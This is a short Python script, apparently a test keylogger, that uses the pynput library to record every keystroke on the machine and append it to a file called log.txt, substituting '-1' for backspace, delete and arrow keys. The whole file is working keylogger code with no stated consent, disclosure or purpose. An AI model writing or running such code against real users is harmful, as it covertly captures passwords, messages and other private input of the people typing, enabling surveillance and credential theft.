from pynput.keyboard import Listener as KeyListener

class keylogtest:

    def __init__(self):
        self.kl = KeyListener()
    
    def wtf(self, key):
        lst = []
        ks = str(key).replace("'","")
        if(ks == 'Key.space'):
            ks = ' ';
        elif(ks == 'Key.backspace'):
            ks = '-1';
        elif(ks == 'Key.delete'):
            ks = '-1';
        elif(ks == 'Key.enter'):
            ks = ' ';
        elif(ks== 'Key.left'):
        	ks='-1';
        elif(ks=='Key.right'):
        	ks='-1';
        lst.append(ks)
        with open("log.txt", 'a') as fl:
            fl.write(ks)

    def main(self):
    	with KeyListener(on_press=self.wtf) as listen:
    		listen.join();
if(__name__=="__main__"):
	obj = keylogtest()
	obj.main()
